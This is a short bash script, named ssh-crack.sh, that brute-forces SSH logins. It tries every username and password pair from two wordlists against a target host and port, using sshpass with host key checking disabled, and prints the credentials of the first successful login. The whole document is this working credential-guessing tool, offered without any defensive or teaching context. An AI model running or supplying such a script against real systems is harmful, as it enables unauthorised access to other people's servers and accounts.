#!/bin/bash

target="${1}"
port="${2}"
usernames=( $(cat "${3}") )
passwords=( $(cat "${4}") )

if [[ "$#" -ne 4 ]] ; then
	echo "Usage:  ./ssh-crack.sh target port username_list password_list"
fi


for user in "${usernames[@]}"; do
	for password in "${passwords[@]}"; do
		if sshpass -p"${password}" ssh1 -o "StrictHostKeyChecking=no" -p "${port}" "${user}"@"${target}" exit > /dev/null 2>&1; then
			echo "Successful login."
			echo "Host: ${target}"
			echo "Username: ${user}"
			echo "Password: ${password}"
			exit 0
		else
			echo "No login for ${user} and ${password} on  ${target}"
		fi
	done
done
